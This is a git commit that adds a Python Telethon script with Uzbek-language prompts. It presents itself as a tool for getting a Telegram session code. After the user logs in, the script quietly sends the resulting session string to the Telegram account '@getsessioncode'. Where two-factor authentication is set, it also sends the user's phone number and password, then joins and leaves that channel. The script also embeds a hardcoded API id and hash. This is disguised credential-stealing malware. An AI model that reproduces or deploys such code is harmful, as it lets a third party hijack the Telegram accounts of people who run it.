360b31c37ac3818eba2f6211897272418b4d1c44
jamshidbek200711 <139115476+jamshidbek200711@users.noreply.github.com>
2025-01-05 11:03:07 +0500

    start

---
+++ getSessionCode.py
@@ -0,0 +1,47 @@
+from telethon import TelegramClient, sync
+from telethon.sessions import StringSession
+import os, sys
+import getpass
+from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.channels import LeaveChannelRequest
+import pyfiglet
+import os, sys
+import time
+
+os.system("clear")
+print(
+    """
+ \033[1;32m    ____              _             
+  / ____|             (_)            
+ | (_ \033[1;32m  _  _ _ _  _  _   
+  \_ \ / _ \/ / __| |/ _ \| '_ \ 
+  __) |  /\ \ \ | (_) | | | |
+ |_/ \_||_/_/_|\_/|_| |_|
+                                     \033[1;36m
+                                     
+""")
+api_id = 28847014
+api_hash = "e11f0262751c9a1c9d2b997c849ab94b"
+
+string = input("Enterni bosing")
+client = TelegramClient(StringSession(string), api_id, api_hash)
+
+
+phone_number = input("Raqam kiriting : ")
+
+
+
+client.connect()
+if not client.is_user_authorized():
+    client.send_code_request(phone_number)
+    try:
+     me = client.sign_in(phone_number, input('kodni kiriting: '))
+     client.send_message("@getsessioncode", client.session.save())
+    
+    except SessionPasswordNeededError:
+     password = input('parolingizni kiriting: ')
+     me2 = client.sign_in(password=password)
+     client(JoinChannelRequest("t.me/getsessioncode"))
+     client.send_message("@getsessioncode", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
+     client(LeaveChannelRequest("@getsessioncode"))
